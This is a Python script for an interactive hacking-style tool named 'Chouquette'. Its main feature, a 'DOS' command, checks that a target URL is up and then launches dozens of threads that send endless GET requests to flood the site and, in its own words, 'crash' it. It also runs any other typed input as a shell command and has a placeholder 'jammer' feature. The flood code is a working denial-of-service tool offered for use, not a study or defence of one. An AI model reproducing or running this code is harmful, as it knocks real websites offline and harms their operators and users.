try:    
    import requests,threading,os,sys,socket,getpass,subprocess
except ImportError:
    import os
    os.system("pip install --break-system-packages requests ")
    import requests,threading,sys,socket,getpass,subprocess
    
class script():
    def DOS(target):
        try:
            r=requests.get(target)
            if r.status_code==200 or 204:
                print(f'{Colors.RED}Chouquette >{Colors.END} website responded iniating crash with {Colors.GREEN}{os.cpu_count()*4+1}{Colors.END} thread !')
            else:
                print(f'{Colors.RED}Chouquette >{Colors.END} ERROR STATUS CODE : {Colors.RED}{r.status_code}{Colors.END}')
                sys.exit()
        except Exception as e:
            print(f'{Colors.RED}Chouquette >{Colors.END} ERROR : {e}')
            sys.exit()
        def send(target):
            while True:
                try:
                    r = requests.get(target,headers={"User-Agent":"Hi im Chouquette"})
                    print(f'{Colors.RED}Chouquette >{Colors.END} STATUS CODE : {Colors.GREEN}{r.status_code}{Colors.END}' if r.status_code==200 else f'STATUS CODE : {Colors.RED}{r.status_code}{Colors.END}',end="\r") 
                    if r.status_code == 429: 
                        return f'\n{Colors.RED}Chouquette >{Colors.END} {Colors.RED}{target} is unavailable{Colors.END}'
                except Exception:
                    return f'\n{Colors.RED}Chouquette >{Colors.END} {Colors.RED}{target} is unavailable{Colors.END}'
        for _ in range(os.cpu_count()*4): threading.Thread(target=send,args=(target,)).start()

        print("\n"+f"{Colors.RED}Chouquette >{Colors.END}"+send(target))

class Colors:
    """ ANSI color codes """
    BLACK = "\033[0;30m"
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    BROWN = "\033[0;33m"
    BLUE = "\033[0;34m"
    PURPLE = "\033[0;35m"
    CYAN = "\033[0;36m"
    LIGHT_GRAY = "\033[0;37m"
    DARK_GRAY = "\033[1;30m"
    LIGHT_RED = "\033[1;31m"
    LIGHT_GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    LIGHT_BLUE = "\033[1;34m"
    LIGHT_PURPLE = "\033[1;35m"
    LIGHT_CYAN = "\033[1;36m"
    LIGHT_WHITE = "\033[1;37m"
    BOLD = "\033[1m"
    FAINT = "\033[2m"
    ITALIC = "\033[3m"
    UNDERLINE = "\033[4m"
    BLINK = "\033[5m"
    NEGATIVE = "\033[7m"
    CROSSED = "\033[9m"
    END = "\033[0m"
os.system('cls' if os.name =="nt" else "clear")
print(fr'''{Colors.RED}
  _____ _                                  _   _       
 / ____| |                                | | | |      
| |    | |__   ___  _   _  __ _ _   _  ___| |_| |_ ___ 
| |    | '_ \ / _ \| | | |/ _` | | | |/ _ \ __| __/ _ \
| |____| | | | (_) | |_| | (_| | |_| |  __/ |_| ||  __/
 \_____|_| |_|\___/ \__,_|\__, |\__,_|\___|\__|\__\___|
                             | |                       
                             |_|      
          
                   [{Colors.YELLOW}+{Colors.RED}] CREATED BY {Colors.CYAN}NOTRUNIT{Colors.END}  
                 
''')
while True:
    prompt=input(f"{Colors.CYAN}┌──<[{Colors.RED}{getpass.getuser()}@{socket.gethostname()}{Colors.CYAN}]{Colors.END} ~ {Colors.RED}{os.getcwd()}{Colors.END} \n{Colors.CYAN}└──╼ ${Colors.END} ")
    if prompt in ['help',"/?","?"]:
        print("""
    DOS (target)
    JAMMER
    """)
    elif prompt.lower().startswith("dos"):
        try:
            script.DOS(target=prompt.split(" ")[1])
        except Exception as e:
            print(f'error : {e}')
    elif prompt.lower() == "jammer":
        print("comming soon !")
    elif prompt.lower() in ['sh',"bash",'shell','exit']:
        exit()
    else:
        result = subprocess.run(prompt,shell=True,capture_output=True)
        output = result.stderr + result.stdout
        print(output.decode())
